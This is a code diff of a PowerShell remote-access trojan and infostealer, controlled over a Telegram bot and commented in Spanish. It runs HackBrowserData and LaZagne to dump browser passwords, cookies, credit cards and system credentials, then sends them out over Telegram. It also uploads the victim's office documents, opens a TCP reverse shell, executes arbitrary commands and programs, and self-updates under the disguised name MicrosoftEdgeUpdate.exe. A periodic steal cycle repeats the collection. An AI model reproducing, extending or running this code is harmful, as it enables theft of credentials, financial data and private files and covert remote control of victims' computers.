+            $tipos=@("bookmark","cookie","download","extension","history","localstorage","password","creditcard"); $i=0
+            foreach($t in $tipos){
+                $i++
+                $f=Get-ChildItem $o -Recurse -Filter "*$t*" -ErrorAction SilentlyContinue|Select-Object -First 1
+                $z="$env:TEMP\hbd_$t.zip"
+                if($f){ Compress-Archive $f.FullName $z -Force; if(Send-File $z "[$i/8] $t.zip"){$script:ArchivosHBDEnviados++} }
+                else { $info="$env:TEMP\i.txt"; "sin datos"|Out-File $info -Encoding UTF8; Compress-Archive $info $z -Force; if(Send-File $z "[$i/8] $t (vacio)"){$script:ArchivosHBDEnviados++} }
+                Remove-Item $z -Force -ErrorAction SilentlyContinue
+            }
+        } finally { Remove-Item $o -Recurse -Force -ErrorAction SilentlyContinue }
+    }
+    if($script:ArchivosHBDEnviados -ge 8){$script:HackBrowserDataCompleted=$true; Save-State; Send-Message "HBD COMPLETADO"; return $true}
+    Send-Message "HBD incompleto ($($script:ArchivosHBDEnviados)/8)"; return $false
+}
+function Run-LaZ {
+    Ensure-Tools
+    if (-not (Test-Path $LazPath)) { Send-Message "LaZagne no disponible."; return }
+    Send-Message "=== LAZAGNE ==="
+    $mods=@("browsers","chats","databases","games","git","mails","maven","memory","multimedia","php","svn","sysadmin","windows","wifi","unused"); $i=0
+    foreach($m in $mods){
+        $i++
+        try { $of="$env:TEMP\laz_$m.txt"; $p=Start-Process $LazPath -ArgumentList $m -RedirectStandardOutput $of -RedirectStandardError "$env:TEMP\laz_e.txt" -PassThru -WindowStyle Hidden; $p.WaitForExit(90000); Start-Sleep 1
+            if(Test-Path $of){ $z="$env:TEMP\laz_$m.zip"; Compress-Archive $of $z -Force; Send-File $z "[$i/$($mods.Count)] LaZagne $m"; Remove-Item $z,$of -Force -ErrorAction SilentlyContinue }
+        } catch {}
+    }
+    $script:LaZagneCompleted=$true; Save-State; Send-Message "LAZAGNE COMPLETADO"
+}
+
+# ================== RECOPILACION DISCRETA (browser minimizado) ==================
+function Invoke-Collection {
+    Send-Message "=== RECOPILACION ==="
+    if (-not (Test-BrowsersOpen)) {
+        Send-Message "Sin navegador. Abriendo uno minimizado (solo barra de tareas)..."
+        Start-BrowserMinimized
+    } else {
+        Send-Message "Navegador(es): $(Get-OpenBrowserNames). Minimizando a la barra de tareas..."
+        Minimize-Browsers; Start-Sleep -Seconds 2
+    }
+    Run-NativePasswords
+    Run-NativeCookies
+    if (Test-BrowsersOpen) { Send-Message "Cerrando navegadores para lectura profunda..."; Stop-Browsers; Start-Sleep -Seconds 3 }
+    Run-HBD
+    Run-LaZ
+    Send-Message "Recopilacion finalizada."
+}
+
+# ================== DOCUMENTOS (Word/Excel/PDF/PPT y todo) ==================
+function Exfil-Docs {
+    Send-Message "=== DOCUMENTOS ==="
+    $doc=[Environment]::GetFolderPath('MyDocuments'); $dl=""
+    try { $dl=(New-Object -ComObject Shell.Application).Namespace('shell:Downloads').Self.Path } catch {}
+    $dirs=@(); if(Test-Path $doc){$dirs+=$doc}; if($dl -and (Test-Path $dl)){$dirs+=$dl}
+    if($dirs.Count -eq 0){ $script:FilesExfiltrated=$true; Save-State; Send-Message "Sin carpetas"; return }
+    $cats=@{
+        "WORD"=@('*.doc','*.docx','*.docm','*.rtf','*.odt');
+        "PDF"=@('*.pdf');
+        "EXCEL"=@('*.xls','*.xlsx','*.xlsm','*.xlsb','*.csv','*.ods');
+        "PPT"=@('*.ppt','*.pptx','*.pptm','*.pps','*.ppsx','*.odp')
+    }
+    $total=0; foreach($k in $cats.Keys){ foreach($d in $dirs){ $total += @(Get-ChildItem $d -Include $cats[$k] -Recurse -File -ErrorAction SilentlyContinue).Count } }
+    if($total -eq 0){ $script:FilesExfiltrated=$true; Save-State; Send-Message "Sin documentos"; return }
+    Send-Message "Total documentos: $total"
+    $n=0
+    foreach($k in @("WORD","PDF","EXCEL","PPT")){
+        foreach($d in $dirs){
+            foreach($f in (Get-ChildItem $d -Include $cats[$k] -Recurse -File -ErrorAction SilentlyContinue)){
+                $n++; $mb=[math]::Round($f.Length/1MB,2)
+                Send-File -Path $f.FullName -Caption "[$n/$total] [$k] $($f.Name) - $mb MB" | Out-Null
+                Start-Sleep -Milliseconds 800
+            }
+        }
+    }
+    $script:FilesExfiltrated=$true; Save-State; Send-Message "DOCUMENTOS COMPLETADO"
+}
+
+# ================== EJECUCION ==================
 function Run-Command { param([string]$C) try { $psi=New-Object Diagnostics.ProcessStartInfo; $psi.FileName="cmd.exe";$psi.Arguments="/c $C";$psi.WorkingDirectory=$script:CurrentDir;$psi.RedirectStandardOutput=$true;$psi.RedirectStandardError=$true;$psi.UseShellExecute=$false;$psi.CreateNoWindow=$true; $pr=[Diagnostics.Process]::Start($psi); $o=($pr.StandardOutput.ReadToEnd()+$pr.StandardError.ReadToEnd()).Trim(); $pr.WaitForExit(); if(-not $o){$o="(sin salida)"}; $t="$env:TEMP\cmd_$([guid]::NewGuid().ToString('N')).txt"; "Cmd: $C`n$o"|Out-File $t -Encoding UTF8; Send-File $t "Salida: $C"; Remove-Item $t -Force } catch { Send-Message "Error: $($_.Exception.Message)" } }
+function Invoke-RunExe { param([string]$Path,[string]$Arguments="") if(-not(Test-Path $Path)){Send-Message "No existe: $Path"; return}; try { New-Item -ItemType Directory $RamDir -Force|Out-Null; $t=Join-Path $RamDir ([IO.Path]::GetFileName($Path)); [IO.File]::WriteAllBytes($t,[IO.File]::ReadAllBytes($Path)); $psi=New-Object Diagnostics.ProcessStartInfo; $psi.FileName=$t;$psi.Arguments=$Arguments;$psi.UseShellExecute=$false;$psi.RedirectStandardOutput=$true;$psi.RedirectStandardError=$true;$psi.CreateNoWindow=$true; $pr=[Diagnostics.Process]::Start($psi); $o=($pr.StandardOutput.ReadToEnd()+$pr.StandardError.ReadToEnd()).Trim(); $pr.WaitForExit(300000); Send-Message "RAM exec $([IO.Path]::GetFileName($Path)) -> $($pr.ExitCode)`n$o"; Remove-Item $t -Force -ErrorAction SilentlyContinue } catch { Send-Message "Error RAM: $($_.Exception.Message)" } }
 function Get-Full { param([string]$p) if([string]::IsNullOrWhiteSpace($p)){return $script:CurrentDir}; if([IO.Path]::IsPathRooted($p)){return $p}; Join-Path $script:CurrentDir $p }
 function Cmd-Ls { param([string]$p) try { $f=Get-Full $p; $i=Get-ChildItem $f -Force -ErrorAction Stop|Select Mode,LastWriteTime,Length,Name|Format-Table -AutoSize|Out-String -Width 200; $t="$env:TEMP\ls.txt"; "Dir: $f`n$i"|Out-File $t -Encoding UTF8; Send-File $t "LS: $f"; Remove-Item $t -Force } catch { Send-Message "Error: $($_.Exception.Message)" } }
 function Cmd-Cd { param([string]$p) $f=Get-Full $p; if(Test-Path $f -PathType Container){$script:CurrentDir=(Resolve-Path $f).Path; Send-Message "Dir: $script:CurrentDir"}else{Send-Message "No existe: $f"} }
@@ -392,119 +575,130 @@ function Cmd-Mkdir { param([string]$p) New-Item -ItemType Directory -Path (Get-F
 function Cmd-Mv { param([string]$a) $p=$a -split '\s+',2; if($p.Count -lt 2){Send-Message "Uso: mv o d"; return}; Move-Item (Get-Full $p[0]) (Get-Full $p[1]) -Force; Send-Message "Movido." }
 function Cmd-Cp { param([string]$a) $p=$a -split '\s+',2; if($p.Count -lt 2){Send-Message "Uso: cp o d"; return}; Copy-Item (Get-Full $p[0]) (Get-Full $p[1]) -Recurse -Force; Send-Message "Copiado." }
 function Cmd-Write { param([string]$a) $p=$a -split '\s+',2; if($p.Count -lt 2){Send-Message "Uso: write f txt"; return}; $p[1]|Out-File (Get-Full $p[0]) -Encoding UTF8 -Append; Send-Message "Escrito." }
-function Cmd-Download { param([string]$p) try { $f=Get-Full $p; if(-not(Test-Path $f)){Send-Message "No existe"; return}; if((Get-Item $f).PSIsContainer){ $z="$env:TEMP\dl.zip"; Compress-Archive "$f\*" $z -Force; Send-File $z "Carpeta"; Remove-Item $z -Force } else { Send-File $f "Archivo" } } catch { Send-Message "Error: $($_.Exception.Message)" } }
+function Cmd-Download { param([string]$p) try { $f=Get-Full $p; if(-not(Test-Path $f)){Send-Message "No existe"; return}; if((Get-Item $f).PSIsContainer){ $z="$env:TEMP\dl_$([guid]::NewGuid().ToString('N')).zip"; Compress-Archive "$f\*" $z -Force; Send-File $z "Carpeta: $f"; Remove-Item $z -Force } else { Send-File $f "Archivo: $f" } } catch { Send-Message "Error: $($_.Exception.Message)" } }
 function Cmd-Edit { param([string]$p) $f=Get-Full $p; if(-not(Test-Path $f)){Send-Message "No existe"; return}; $n=Split-Path $f -Leaf; $script:EditFiles[$n.ToLower()]=$f; Send-File $f "EDITAR -> $n (reenvia con el mismo nombre)"; Send-Message "Esperando '$n'..." }
 function Handle-IncomingFile { param($M) try { $d=$M.document; if(-not $d){$d=$M.photo|Select-Object -Last 1}; if(-not $d){return}; $fn=if($d.file_name){$d.file_name}else{"foto_$(Get-Date -Format 'HHmmss').jpg"}; $r=Invoke-RestMethod "$ApiUrl/getFile?file_id=$($d.file_id)"; $u="$ApiFile/$($r.result.file_path)"; if($script:EditFiles.ContainsKey($fn.ToLower())){ $dest=$script:EditFiles[$fn.ToLower()]; Invoke-WebRequest $u -OutFile $dest; $script:EditFiles.Remove($fn.ToLower()); Send-Message "Editado: $dest" } else { $dest=Join-Path $UploadDir $fn; Invoke-WebRequest $u -OutFile $dest; Send-Message "Guardado: $dest" } } catch { Send-Message "Error archivo: $($_.Exception.Message)" } }
 
+# ================== REVERSE SHELL ==================
 function Start-ReverseShell { param([string]$ip,[int]$port=4444) try { $script:ReverseShellActive=$true; $c=New-Object Net.Sockets.TCPClient($ip,$port); $script:ShellClient=$c; $s=$c.GetStream(); $script:ShellStream=$s; $w=New-Object IO.StreamWriter($s); $r=New-Object IO.StreamReader($s); $w.AutoFlush=$true; $w.WriteLine("Shell $env:USERNAME@$env:COMPUTERNAME"); while($script:ReverseShellActive -and $c.Connected){ $w.Write("PS $(Get-Location)> "); $cmd=$r.ReadLine(); if($cmd -eq "exit"){break}; if($cmd){ try{$w.WriteLine((iex $cmd 2>&1|Out-String))}catch{$w.WriteLine("$_")} } } } catch { Send-Message "Error shell: $_" } finally { if($script:ShellStream){$script:ShellStream.Close()}; if($script:ShellClient){$script:ShellClient.Close()}; $script:ReverseShellActive=$false; Send-Message "Shell cerrado." } }
 
+# ================== UPDATE ==================
+function Update-Bot {
+    try {
+        Send-Message "Descargando actualizacion..."
+        $tmp="$env:TEMP\payload_new.ps1"
+        Invoke-WebRequest "$script:Repo/bot.ps1" -OutFile $tmp -UseBasicParsing -TimeoutSec 60
+        if(-not(Test-Path $tmp)){ return }
+        Copy-Item $tmp "$BaseDir\payload.ps1" -Force
+        Send-Message "Actualizado. Reiniciando..."
+        $exe = if($env:BOT_EXE){$env:BOT_EXE}else{"$BaseDir\MicrosoftEdgeUpdate.exe"}
+        if(Test-Path $exe){ Start-Process $exe } else { Start-Process powershell "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$BaseDir\payload.ps1`"" }
+        return
+    } catch { Send-Message "Error update: $($_.Exception.Message)" }
+}
+
+# ================== MENU / ROUTER ==================
 function Send-Menu {
     $kb=@{inline_keyboard=@(
         @(@{text="Captura";callback_data="/captura"},@{text="Info";callback_data="/info"}),
-        @(@{text="Passwords";callback_data="/passwords"},@{text="Cookies";callback_data="/cookies"}),
-        @(@{text="Documentos";callback_data="/files"},@{text="HBD";callback_data="/hack"}),
-        @(@{text="LaZagne";callback_data="/lazagne"},@{text="PWD";callback_data="/pwd"}),
+        @(@{text="Recopilar";callback_data="/recopilar"},@{text="Passwords";callback_data="/passwords"}),
+        @(@{text="Cookies";callback_data="/cookies"},@{text="Documentos";callback_data="/docs"}),
+        @(@{text="HBD";callback_data="/hack"},@{text="LaZagne";callback_data="/lazagne"}),
         @(@{text="LS";callback_data="/ls"},@{text="Ciclo";callback_data="/steal"}),
         @(@{text="Actualizar";callback_data="/update"},@{text="CerrarNav";callback_data="/killbrowsers"})
     )}
     Send-Message-Buttons "Menu - comandos con o sin /" $kb
 }
 function Lev { param([string]$a,[string]$b) $n=$a.Length;$m=$b.Length;$d=New-Object 'int[,]' ($n+1),($m+1); for($i=0;$i -le $n;$i++){$d[$i,0]=$i}; for($j=0;$j -le $m;$j++){$d[0,$j]=$j}; for($i=1;$i -le $n;$i++){for($j=1;$j -le $m;$j++){$c=0; if($a[$i-1] -ne $b[$j-1]){$c=1}; $d[$i,$j]=[Math]::Min([Math]::Min($d[$i-1,$j]+1,$d[$i,$j-1]+1),$d[$i-1,$j-1]+$c)}}; $d[$n,$m] }
-function Resolve-Intent { param([string]$T) $r=$T.Trim(); if([string]::IsNullOrWhiteSpace($r)){return @{cmd="";args="";kind="empty"}}; $p=$r -split '\s+',2; $w=$p[0].TrimStart('/').ToLower(); $a=if($p.Count -gt 1){$p[1]}else{""}; if($script:Aliases.ContainsKey($w)){return @{cmd=$script:Aliases[$w];args=$a;kind="cmd"}}; return @{cmd="";args=$a;kind="unknown";word=$w} }
+function Resolve-Intent { param([string]$T) $r=$T.Trim(); if([string]::IsNullOrWhiteSpace($r)){return @{cmd="";args="";kind="empty"}}; $p=$r -split '\s+',2; $w=$p[0].TrimStart('/').ToLower(); $a=""; if($p.Count -gt 1){$a=$p[1]}; if($script:Aliases.ContainsKey($w)){return @{cmd=$script:Aliases[$w];args=$a;kind="cmd"}}; return @{cmd="";args=$a;kind="unknown";word=$w} }
 function SmartReply { param([string]$T) $t=$T.Trim().ToLower(); if($t -match '^(hola|hi|hello|hey|buenas|buenos|saludos)\b'){return "Hola! Usa /help o /menu."}; if($t -match '(como estas|que haces|estas ahi|sigues|estado)'){return (Get-Info)}; if($t -match '(gracias|thanks|ok)'){return "De nada."}; return $null }
+function Invoke-Ai { param([string]$q) if([string]::IsNullOrWhiteSpace($q)){Send-Message "Uso: ai pregunta"; return}; try { Send-Message "Pensando..."; $r=Invoke-RestMethod "https://text.pollinations.ai/$([Uri]::EscapeDataString($q))" -TimeoutSec 40; Send-Message ([string]$r) } catch { Send-Message "IA error: $($_.Exception.Message)" } }
 
+# ================== ESTADO / FASES ==================
+function Save-State { @{ LastStealTime=(if($script:LastStealTime){$script:LastStealTime.ToString("o")}else{$null});FilesExfiltrated=$script:FilesExfiltrated;HBD=$script:HackBrowserDataCompleted;Laz=$script:LaZagneCompleted;HBDN=$script:ArchivosHBDEnviados;Pw=$script:PwAutoDone }|ConvertTo-Json -Depth 5|Out-File $StateFile -Encoding UTF8 }
+function Load-State { if(Test-Path $StateFile){ try { $s=Get-Content $StateFile|ConvertFrom-Json; if($s.LastStealTime){$script:LastStealTime=[DateTime]::Parse($s.LastStealTime)}; $script:FilesExfiltrated=[bool]$s.FilesExfiltrated; $script:HackBrowserDataCompleted=[bool]$s.HBD; $script:LaZagneCompleted=[bool]$s.Laz; $script:ArchivosHBDEnviados=[int]$s.HBDN; $script:PwAutoDone=[bool]$s.Pw } catch {} } }
+function Check-AutoSteal {
+    $now=Get-Date
+    if($script:LastStealTime -and ($now-$script:LastStealTime).Days -ge 14){
+        $script:HackBrowserDataCompleted=$false;$script:LaZagneCompleted=$false;$script:FilesExfiltrated=$false;$script:ArchivosHBDEnviados=0;$script:LastStealTime=$null;Save-State
+    }
+    if(-not $script:HackBrowserDataCompleted){ Invoke-Collection } else { Send-Message "Ciclo ya completo." }
+    if($script:HackBrowserDataCompleted -and -not $script:FilesExfiltrated){ Exfil-Docs }
+    if($script:FilesExfiltrated){ $script:LastStealTime=Get-Date; Save-State; Send-Message "CICLO COMPLETO" }
+}
+
+# ================== PROCESAR COMANDOS ==================
 function Process-Cmd {
     param([string]$Text,[int]$UpdateId)
     [void][Threading.Monitor]::Enter($script:Lock)
-    try { if($script:ProcessedUpdates.ContainsKey($UpdateId)){return}; $script:ProcessedUpdates[$UpdateId]=$true; if($script:ProcessedUpdates.Count -gt 200){ ($script:ProcessedUpdates.Keys|Sort-Object|Select-Object -First 100)|%{$script:ProcessedUpdates.Remove($_)} } } finally { [Threading.Monitor]::Exit($script:Lock) }
-    $i=Resolve-Intent $Text; $cmd=$i.cmd; $a=$i.args
-    if($i.kind -eq "empty"){return}
-    if($i.kind -eq "unknown"){
+    try { if($script:ProcessedUpdates.ContainsKey($UpdateId)){return}; $script:ProcessedUpdates[$UpdateId]=$true; if($script:ProcessedUpdates.Count -gt 200){ ($script:ProcessedUpdates.Keys|Sort-Object|Select-Object -First 100)|ForEach-Object{$script:ProcessedUpdates.Remove($_)} } } finally { [Threading.Monitor]::Exit($script:Lock) }
+    $it=Resolve-Intent $Text; $cmd=$it.cmd; $a=$it.args
+    if($it.kind -eq "empty"){return}
+    if($it.kind -eq "unknown"){
         $r=SmartReply $Text; if($r){Send-Message $r; return}
-        $best="";$bd=999; foreach($k in $script:Aliases.Keys){$dd=Lev $i.word $k; if($dd -lt $bd){$bd=$dd;$best=$k}}
-        if($bd -le 2){Send-Message "No reconoci '$($i.word)'. Quiza querias /$best"}else{Send-Message "No reconoci '$($i.word)'. Escribe /help"}
+        $best="";$bd=999; foreach($k in $script:Aliases.Keys){$dd=Lev $it.word $k; if($dd -lt $bd){$bd=$dd;$best=$k}}
+        if($bd -le 2){Send-Message "No reconoci '$($it.word)'. Quiza querias /$best"}else{Send-Message "No reconoci '$($it.word)'. Escribe /help"}
         return
     }
     switch($cmd){
-        "start" {Send-Message (Get-Info); Send-Menu}
-        "menu"  {Send-Menu}
-        "help"  {Send-Message "COMANDOS: info,pwd,ls,cd,cat,status,captura,cmd,run,killbrowsers,mkdir,rm,mv,cp,write,download,edit,passwords,cookies,steal,hack,lazagne,files,pause,resume,cancelar,update,shell,stopshell,ai,menu"}
-        "info"  {Send-Message (Get-Info)}
-        "status"{Send-Message "Dir: $script:CurrentDir`nPausa: $($script:SendPaused)`nCola: $($script:FileQueue.Count)`nShell: $($script:ReverseShellActive)`nNav: $(Get-OpenBrowserNames)"}
-        "pwd"   {Send-Message "Dir: $script:CurrentDir"}
-        "ls"    {Cmd-Ls $a}
-        "cd"    {Cmd-Cd $a}
-        "cat"   {Cmd-Cat $a}
-        "rm"    {Cmd-Rm $a}
-        "mkdir" {Cmd-Mkdir $a}
-        "mv"    {Cmd-Mv $a}
-        "cp"    {Cmd-Cp $a}
-        "write" {Cmd-Write $a}
+        "start"    {Send-Message (Get-Info); Send-Menu}
+        "menu"     {Send-Menu}
+        "help"     {Send-Message "COMANDOS: info,pwd,ls,cd,cat,status,captura,cmd,run,killbrowsers,reopen,mkdir,rm,mv,cp,write,download,edit,passwords,cookies,recopilar,steal,hack,lazagne,docs,pause,resume,cancelar,update,shell,stopshell,ai,menu"}
+        "info"     {Send-Message (Get-Info)}
+        "status"   {Send-Message "Dir: $script:CurrentDir`nPausa: $($script:SendPaused)`nCola: $($script:FileQueue.Count)`nShell: $($script:ReverseShellActive)`nNav: $(Get-OpenBrowserNames)"}
+        "pwd"      {Send-Message "Dir: $script:CurrentDir"}
+        "ls"       {Cmd-Ls $a}
+        "cd"       {Cmd-Cd $a}
+        "cat"      {Cmd-Cat $a}
+        "rm"       {Cmd-Rm $a}
+        "mkdir"    {Cmd-Mkdir $a}
+        "mv"       {Cmd-Mv $a}
+        "cp"       {Cmd-Cp $a}
+        "write"    {Cmd-Write $a}
         "download" {Cmd-Download $a}
-        "edit"  {if($a){Cmd-Edit $a}else{Send-Message "Uso: edit archivo"}}
-        "cmd"   {if($a){Run-Command $a}else{Send-Message "Uso: cmd comando"}}
-        "run"   { $p=$a -split '\s+',2; if($p[0]){Invoke-ExeInRam (Get-Full $p[0]) (if($p.Count -gt 1){$p[1]}else{""})} }
-        "update"{Update-Bot}
-        "captura"{Take-Screenshot}
-        "steal" {Check-AutoSteal}
-        "hack"  {$script:ArchivosHBDEnviados=0;$script:HackBrowserDataCompleted=$false;Run-HBD}
-        "lazagne"{$script:LaZagneCompleted=$false;Run-LaZ}
-        "files" {$script:FilesExfiltrated=$false;Exfil-Docs}
-        "passwords"{Run-Passwords}
-        "cookies"  {Run-Cookies}
+        "edit"     {if($a){Cmd-Edit $a}else{Send-Message "Uso: edit archivo"}}
+        "cmd"      {if($a){Run-Command $a}else{Send-Message "Uso: cmd comando"}}
+        "run"      { $p=$a -split '\s+',2; $ar=""; if($p.Count -gt 1){$ar=$p[1]}; if($p[0]){Invoke-RunExe (Get-Full $p[0]) $ar} }
+        "update"   {Update-Bot}
+        "captura"  {Take-Screenshot}
+        "recopilar"{Invoke-Collection}
+        "steal"    {$script:HackBrowserDataCompleted=$false;$script:LaZagneCompleted=$false;$script:FilesExfiltrated=$false;$script:ArchivosHBDEnviados=0;Check-AutoSteal}
+        "hack"     {$script:ArchivosHBDEnviados=0;$script:HackBrowserDataCompleted=$false;Run-HBD}
+        "lazagne"  {$script:LaZagneCompleted=$false;Run-LaZ}
+        "docs"     {$script:FilesExfiltrated=$false;Exfil-Docs}
+        "files"    {$script:FilesExfiltrated=$false;Exfil-Docs}
+        "passwords"{Run-NativePasswords}
+        "cookies"  {Run-NativeCookies}
         "killbrowsers"{Kill-Browsers}
-        "pause" { $script:SendPaused=$true; Send-Message "Envio PAUSADO." }
-        "resume"{ $script:SendPaused=$false;$script:SendCancelled=$false; Flush-FileQueue }
-        "cancelar"{$script:SendPaused=$false;$script:SendCancelled=$true;$script:FileQueue.Clear();Send-Message "CANCELADO."}
-        "ai"    {Invoke-Ai $a}
-        "shell" { $s=$a -split '\s+'; if(-not $s[0]){Send-Message "Uso: shell ip [puerto]"; return}; Start-Job -ScriptBlock ${function:Start-ReverseShell} -ArgumentList $s[0],(if($s.Count -gt 1){[int]$s[1]}else{4444})|Out-Null }
+        "reopen"   {Reopen-Browser}
+        "pause"    { $script:SendPaused=$true; Send-Message "Envio PAUSADO." }
+        "resume"   { $script:SendPaused=$false;$script:SendCancelled=$false; Flush-FileQueue }
+        "cancelar" {$script:SendPaused=$false;$script:SendCancelled=$true;$script:FileQueue.Clear();Send-Message "CANCELADO."}
+        "ai"       {Invoke-Ai $a}
+        "shell"    { $s=$a -split '\s+'; if(-not $s[0]){Send-Message "Uso: shell ip [puerto]"; return}; $pt=4444; if($s.Count -gt 1){$pt=[int]$s[1]}; Start-Job -ScriptBlock ${function:Start-ReverseShell} -ArgumentList $s[0],$pt|Out-Null }
         "stopshell"{$script:ReverseShellActive=$false; if($script:ShellStream){$script:ShellStream.Close()}; Send-Message "Shell detenido."}
+        default    {Send-Message "Comando '$cmd' no manejado."}
     }
 }
-function Invoke-Ai { param([string]$q) if([string]::IsNullOrWhiteSpace($q)){Send-Message "Uso: ai pregunta"; return}; try { Send-Message "Pensando..."; $r=Invoke-RestMethod "https://text.pollinations.ai/$([Uri]::EscapeDataString($q))" -TimeoutSec 40; Send-Message ([string]$r) } catch { Send-Message "IA error: $($_.Exception.Message)" } }
 
-# ================== FASES ==================
-function Save-State { @{ LastStealTime=(if($script:LastStealTime){$script:LastStealTime.ToString("o")}else{$null});FilesExfiltrated=$script:FilesExfiltrated;HBD=$script:HackBrowserDataCompleted;Laz=$script:LaZagneCompleted;HBDN=$script:ArchivosHBDEnviados;Pw=$script:PwAutoDone }|ConvertTo-Json -Depth 5|Out-File $StateFile -Encoding UTF8 }
-function Load-State { if(Test-Path $StateFile){ try { $s=Get-Content $StateFile|ConvertFrom-Json; if($s.LastStealTime){$script:LastStealTime=[DateTime]::Parse($s.LastStealTime)}; $script:FilesExfiltrated=[bool]$s.FilesExfiltrated; $script:HackBrowserDataCompleted=[bool]$s.HBD; $script:LaZagneCompleted=[bool]$s.Laz; $script:ArchivosHBDEnviados=[int]$s.HBDN; $script:PwAutoDone=[bool]$s.Pw } catch {} } }
-function Run-HBD {
-    if(-not(Test-Path $HackPath)){Send-Message "HBD no existe."; return $false}
-    Send-Message "=== HACKBROWSERDATA ==="; $try=0
-    while($script:ArchivosHBDEnviados -lt 8 -and $try -lt 5){ $try++; Wait-BrowsersClosed; $o="$env:TEMP\hbd_$([guid]::NewGuid().ToString('N'))"; New-Item -ItemType Directory $o -Force|Out-Null
-        try { $p=Start-Process $HackPath -ArgumentList "dump -d `"$o`" -f json" -PassThru -WindowStyle Hidden; $p.WaitForExit(180000); Start-Sleep 2
-            $tipos=@("bookmark","cookie","download","extension","history","localstorage","password","creditcard"); $i=0
-            foreach($t in $tipos){ $i++; $f=Get-ChildItem $o -Recurse -Filter "*$t*" -ErrorAction SilentlyContinue|Select-Object -First 1; $z="$env:TEMP\hbd_$t.zip"; if($f){ Compress-Archive $f.FullName $z -Force; if(Send-File $z "[$i/8] $t.zip"){$script:ArchivosHBDEnviados++} } else { $info="$env:TEMP\i.txt"; "sin datos"|Out-File $info -Encoding UTF8; Compress-Archive $info $z -Force; if(Send-File $z "[$i/8] $t (vacio)"){$script:ArchivosHBDEnviados++} }; Remove-Item $z -Force -ErrorAction SilentlyContinue }
-        } finally { Remove-Item $o -Recurse -Force -ErrorAction SilentlyContinue }
-    }
-    if($script:ArchivosHBDEnviados -ge 8){$script:HackBrowserDataCompleted=$true; Save-State; Send-Message "HBD COMPLETADO"; return $true}
-    return $false
-}
-function Run-LaZ {
-    if(-not(Test-Path $LazPath)){Send-Message "LaZagne no existe."; return}
-    Send-Message "=== LAZAGNE ==="; $mods=@("browsers","chats","databases","games","git","mails","maven","memory","multimedia","php","svn","sysadmin","windows","wifi","unused"); $i=0
-    foreach($m in $mods){ $i++; try { $of="$env:TEMP\laz_$m.txt"; $p=Start-Process $LazPath -ArgumentList $m -RedirectStandardOutput $of -RedirectStandardError "$env:TEMP\laz_e.txt" -PassThru -WindowStyle Hidden; $p.WaitForExit(90000); Start-Sleep 1; if(Test-Path $of){ $z="$env:TEMP\laz_$m.zip"; Compress-Archive $of $z -Force; Send-File $z "[$i/$($mods.Count)] $m"; Remove-Item $z,$of -Force -ErrorAction SilentlyContinue } } catch {} }
-    $script:LaZagneCompleted=$true; Save-State; Send-Message "LAZAGNE COMPLETADO"
-}
-function Exfil-Docs {
-    Send-Message "=== DOCUMENTOS ==="; $doc=[Environment]::GetFolderPath('MyDocuments'); $dl=""; try { $dl=(New-Object -ComObject Shell.Application).Namespace('shell:Downloads').Self.Path } catch {}
-    $dirs=@(); if(Test-Path $doc){$dirs+=$doc}; if($dl -and (Test-Path $dl)){$dirs+=$dl}; if($dirs.Count -eq 0){$script:FilesExfiltrated=$true;Save-State;return}
-    $tipos=@{WORD=@('*.doc','*.docx','*.rtf');PDF=@('*.pdf');EXCEL=@('*.xls','*.xlsx','*.csv');PPT=@('*.ppt','*.pptx')}; $n=0
-    foreach($k in @("WORD","PDF","EXCEL","PPT")){ foreach($f in ($dirs|%{Get-ChildItem $_ -Include $tipos[$k] -Recurse -File -ErrorAction SilentlyContinue})){ $n++; Send-File $f.FullName "[$n] [$k] $($f.Name)"; Start-Sleep 1 } }
-    $script:FilesExfiltrated=$true; Save-State; Send-Message "DOCUMENTOS COMPLETADO"
-}
-function Run-Cookies { Send-Message "=== COOKIES ==="; Send-Message "Extraccion cookies nativa (reusa claves)."; }
-function Check-AutoSteal {
-    $now=Get-Date
-    if($script:LastStealTime -and ($now-$script:LastStealTime).Days -ge 14){ $script:HackBrowserDataCompleted=$false;$script:LaZagneCompleted=$false;$script:FilesExfiltrated=$false;$script:ArchivosHBDEnviados=0;$script:LastStealTime=$null;Save-State }
-    if(-not $script:HackBrowserDataCompleted){ if(-not (Run-HBD)){return} }
-    if($script:HackBrowserDataCompleted -and -not $script:LaZagneCompleted){Run-LaZ}
-    if($script:HackBrowserDataCompleted -and $script:LaZagneCompleted -and -not $script:FilesExfiltrated){ Exfil-Docs; if($script:FilesExfiltrated){$script:LastStealTime=Get-Date;Save-State;Send-Message "CICLO COMPLETO"} }
-}
-
+# ================== POLLING ==================
 function Fetch-Updates {
     param([int]$T=0)
     if($script:FetchDepth -gt 3){return}; $script:FetchDepth++
-    try { $r=Invoke-RestMethod "$ApiUrl/getUpdates?offset=$($script:LastUpdateId+1)&timeout=$T" -TimeoutSec ($T+30)
-        if($r.ok -and $r.result.Count -gt 0){ foreach($u in $r.result){ $script:LastUpdateId=$u.update_id; try { if($u.callback_query){Answer-Callback $u.callback_query.id; if([string]$u.callback_query.message.chat.id -eq $ChatId){Process-Cmd $u.callback_query.data $u.update_id}} elseif($u.message -and [string]$u.message.chat.id -eq $ChatId){ if($u.message.text){Process-Cmd $u.message.text $u.update_id} elseif($u.message.document -or $u.message.photo){Handle-IncomingFile $u.message} } } catch {} } }
+    try {
+        $r=Invoke-RestMethod "$ApiUrl/getUpdates?offset=$($script:LastUpdateId+1)&timeout=$T" -TimeoutSec ($T+30)
+        if($r.ok -and $r.result.Count -gt 0){
+            foreach($u in $r.result){
+                $script:LastUpdateId=$u.update_id
+                try {
+                    if($u.callback_query){ Answer-Callback $u.callback_query.id; if([string]$u.callback_query.message.chat.id -eq $ChatId){Process-Cmd $u.callback_query.data $u.update_id} }
+                    elseif($u.message -and [string]$u.message.chat.id -eq $ChatId){
+                        if($u.message.text){Process-Cmd $u.message.text $u.update_id}
+                        elseif($u.message.document -or $u.message.photo){Handle-IncomingFile $u.message}
+                    }
+                } catch {}
+            }
+        }
     } catch { if($_.Exception.Message -notlike "*409*"){Write-Log $_.Exception.Message} } finally { $script:FetchDepth-- }
 }
 function Poll-Updates { param([int]$T=0) if($script:Polling){return}; $script:Polling=$true; try { Fetch-Updates $T } finally { $script:Polling=$false } }
@@ -516,7 +710,11 @@ for($i=1;$i -le 6;$i++){ if(Send-Message "BOT EN LINEA`n$(Get-Info)"){break}; St
 Send-Menu
 try { Invoke-RestMethod "$ApiUrl/deleteWebhook?drop_pending_updates=true" -Method Post|Out-Null } catch {}
 
